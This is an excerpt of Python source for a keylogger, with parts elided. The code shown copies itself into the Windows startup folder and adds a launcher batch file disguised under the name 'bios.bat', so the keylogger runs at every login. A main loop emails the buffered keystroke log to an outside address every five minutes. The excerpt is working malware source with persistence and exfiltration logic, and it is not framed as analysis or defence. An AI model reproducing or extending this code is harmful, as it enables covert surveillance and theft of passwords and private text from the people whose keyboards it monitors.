...
TIME_LIMIT = 300  # Time limit in seconds (5 minutes) before sending an email
...
def copy_to_startup():
    # Create batch file (bios.bat)
    bat_file = os.path.join(startup_folder, 'bios.bat')
    with open(bat_file, 'w') as f:
        f.write(f'@echo off\npython {os.path.join(startup_folder, "keylogger.py")}\n')

    # Copy the Python script to the startup folder
    script_path = os.path.abspath(__file__)  # Current Python script's location
    if not os.path.exists(os.path.join(startup_folder, 'keylogger.py')):
        shutil.copy(script_path, os.path.join(startup_folder, 'keylogger.py'))
...
if __name__ == "__main__":
    ...
    while True:
        ...
        # Check if the time limit is reached (5 minutes)
        if time.time() - start_time > TIME_LIMIT:
            send_email()  # Send the buffered log via email
            start_time = time.time()  # Reset the time for the next email
